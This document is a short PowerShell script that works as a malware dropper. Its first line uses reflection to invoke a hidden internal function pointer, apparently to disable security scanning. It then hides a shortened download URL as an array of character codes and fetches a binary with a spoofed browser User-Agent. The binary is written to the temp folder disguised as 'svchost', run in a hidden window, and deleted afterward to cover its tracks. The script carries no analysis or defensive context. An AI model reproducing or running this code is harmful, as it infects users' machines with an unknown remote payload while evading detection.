$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.FullName-like"*Context"){foreach($c in $b.GetFields('NonPublic,Static')){if($c.Name-like"*Context"){$d=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($c.GetValue($b.GetValue(0)),[IntPtr]);$d.Invoke([IntPtr]0,[uint32]0,[IntPtr]0)}}}}

$u=104,116,116,112,115,58,47,47,117,46,116,111,47,90,72,90,51,73,103;$url=[string]::Concat(($u|%{[char]$_}))

$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');$b=$wc.DownloadData($url);$wc.Dispose()

$f="$env:TEMP\svchost_$([guid]::NewGuid().Guid.Split('-')[0]).exe";[IO.File]::WriteAllBytes($f,$b)

$psi=New-Object System.Diagnostics.ProcessStartInfo;$psi.FileName=$f;$psi.WindowStyle=[Diagnostics.ProcessWindowStyle]::Hidden;$psi.CreateNoWindow=$true;$psi.UseShellExecute=$false;$psi.RedirectStandardOutput=$true;$psi.RedirectStandardError=$true;[Diagnostics.Process]::Start($psi)

$b=$null;[GC]::Collect();[GC]::WaitForPendingFinalizers();Start-Sleep -m 150;Remove-Item $f -Force -ErrorAction SilentlyContinue;[Environment]::Exit(0)